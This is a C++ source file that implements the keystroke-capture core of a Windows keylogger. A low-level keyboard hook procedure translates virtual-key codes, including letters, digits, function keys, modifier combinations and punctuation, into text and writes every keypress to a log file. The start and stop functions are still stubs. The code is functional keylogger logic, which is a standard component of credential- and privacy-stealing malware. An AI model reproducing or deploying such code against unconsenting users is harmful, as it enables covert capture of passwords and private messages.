#include "KeyboardHooking.h"
#include "Logging.h"
#include "SpecialKeys.h"

void KeyboardHooking::StartKeyboardHooking()
{
	// TBD
}

void KeyboardHooking::StopKeyboardHooking()
{
	// TBD
}

void KeyboardHooking::MsgLoop()
{
	MSG message;
	while (GetMessage(&message,NULL,0,0))
    {
		TranslateMessage(&message);
		DispatchMessage(&message);
    }
}

LRESULT CALLBACK KeyboardHooking::HookProc(int code
						  , WPARAM wParam
						  , LPARAM lParam
						  , std::string file_name
						  , std::map<UINT, UINT>& key_list)
{
	Logging Logger;
	 		
	if (wParam == WM_SYSKEYDOWN) // for alt key
	{
		SpecialKeys Key;
		if (Key.KeyIsDownNow(VK_MENU)
			|| Key.KeyIsDownNow(VK_LMENU)
			|| Key.KeyIsDownNow(VK_RMENU))
		
			Logger.Print(" ALT + KEY ", file_name);
	}

	if (wParam == WM_KEYDOWN) // if the key is down
	{
		//get the key from lParam
		PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code

		if (key_list.count(key->vkCode) == 0)
		{
			Logger.Print("[UNDEFINED: vkCode = ", file_name);
			Logger.Print(std::to_string(key->vkCode), file_name);
			Logger.Print("] ", file_name);
		}
			
		SpecialKeys Key;
		
		if ((Key.KeyIsDownNow(VK_CONTROL)
			|| Key.KeyIsDownNow(VK_LCONTROL)
			|| Key.KeyIsDownNow(VK_RCONTROL))
			&& !Key.KeyWasDownBefore(VK_CONTROL)
			&& !Key.KeyWasDownBefore(VK_LCONTROL)
			&& !Key.KeyWasDownBefore(VK_RCONTROL))
			
			Logger.Print("CTRL +", file_name);

		if ((Key.KeyIsDownNow(VK_SHIFT)
			|| Key.KeyIsDownNow(VK_LSHIFT)
			|| Key.KeyIsDownNow(VK_RSHIFT))
			&& !Key.KeyWasDownBefore(VK_SHIFT)
			&& !Key.KeyWasDownBefore(VK_LSHIFT)
			&& !Key.KeyWasDownBefore(VK_RSHIFT))
			
			Logger.Print("SHIFT +", file_name);
							
		if ((key->vkCode >= 0x30 && key->vkCode <= 0x39)
			|| (key->vkCode >= 0x41 && key->vkCode <= 0x5A))
		{
			UINT scan_code = MapVirtualKey(key->vkCode, 0);
			scan_code <<= 16; //shift 16 bits
			char key_name[16];
			GetKeyNameTextA(scan_code,key_name,16); // copies scan_code to key_name
			Logger.Print(key_name, file_name);
			
		}

		if (key->vkCode >= 0x70 && key->vkCode <= 0x7B) // F1 ~ F12
		{
			Logger.Print("[F", file_name);
			Logger.Print(std::to_string(key->vkCode - 111), file_name);
			Logger.Print("]", file_name);
		}

		if (key->vkCode >= 0x60 && key->vkCode <= 0x69 && Key.KeyIsToggled(VK_NUMLOCK))
		{
			Logger.Print("[Num", file_name);
			Logger.Print(std::to_string(key->vkCode - 95), file_name);
			Logger.Print("]", file_name);
		}

		switch (key->vkCode) 
		{
		case VK_CANCEL:	Logger.Print(" CTRLBREAK ", file_name); break;
		case VK_BACK: Logger.Print(" BACKSPACE ", file_name); break;
		case VK_TAB: Logger.Print(" TAB ", file_name); break;
		case VK_CLEAR: Logger.Print(" CLEAR ", file_name); break;
		case VK_RETURN: Logger.Print(" ENTER ", file_name); break;
		case VK_PAUSE: Logger.Print(" PAUSE ", file_name); break;
		case VK_ESCAPE: Logger.Print(" ESCAPE ", file_name); break;
		case VK_SPACE: Logger.Print(" ", file_name); break;
		case VK_PRIOR: Logger.Print(" PAGEUP ", file_name); break;
		case VK_NEXT: Logger.Print(" PAGEDOWN ", file_name); break;
		case VK_END: Logger.Print(" END ", file_name); break;
		case VK_HOME: Logger.Print(" HOME ", file_name); break;
		case VK_LEFT: Logger.Print(" LEFT ", file_name); break;
		case VK_UP: Logger.Print(" UP ", file_name); break;
		case VK_RIGHT: Logger.Print(" RIGHT ", file_name); break;
		case VK_DOWN: Logger.Print(" DOWN ", file_name); break;
		case VK_SELECT: Logger.Print(" SELECT ", file_name); break;
		case VK_PRINT: Logger.Print(" PRINT ", file_name); break;
		case VK_EXECUTE: Logger.Print(" EXECUTE ", file_name); break;
		case VK_SNAPSHOT: Logger.Print(" PRINTSCR ", file_name); break;
		case VK_INSERT: Logger.Print(" INSERT ", file_name); break;
		case VK_DELETE: Logger.Print(" DELETE ", file_name); break;
		case VK_LWIN: Logger.Print(" LEFTWIN ", file_name); break;
		case VK_RWIN: Logger.Print(" RIGHTWIN ", file_name); break;
		case VK_APPS: Logger.Print(" APPSKEY ", file_name); break;
		case VK_SLEEP: Logger.Print(" SLEEP ", file_name); break;
		case 0xBA: Logger.Print(" ; ", file_name); break;
		case 0xBB: Logger.Print(" = ", file_name); break;
		case 0xBC: Logger.Print(" , ", file_name); break;
		case 0xBD: Logger.Print(" - ", file_name); break;
		case 0xBE: Logger.Print(" . ", file_name); break;
		case 0xBF: Logger.Print(" / ", file_name); break;
		case 0xC0: Logger.Print(" ` ", file_name); break;
		case 0xDB: Logger.Print(" [ ", file_name); break;
		case 0xDC: Logger.Print(" \\ ", file_name); break;
		case 0xDD: Logger.Print(" ] ", file_name); break;
		case 0xDE: Logger.Print(" \' ", file_name); break;
		case VK_MULTIPLY: Logger.Print(" Num * ", file_name); break;
		case VK_ADD: Logger.Print(" Num + ", file_name); break;
		case VK_SEPARATOR: Logger.Print(" Num , ", file_name); break;
		case VK_SUBTRACT: Logger.Print(" Num - ", file_name); break;
		case VK_DECIMAL: Logger.Print(" Num . ", file_name); break;
		case VK_DIVIDE: Logger.Print(" Num / ", file_name); break;
		case VK_CAPITAL: Logger.Print(" CAPSLOCK ", file_name); break;
		case VK_SCROLL: Logger.Print(" SCROLLLOCK ", file_name); break;
		case VK_NUMLOCK: Logger.Print(" NUM ", file_name); break;
		}
	}
	return CallNextHookEx(NULL, code, wParam, lParam);
}




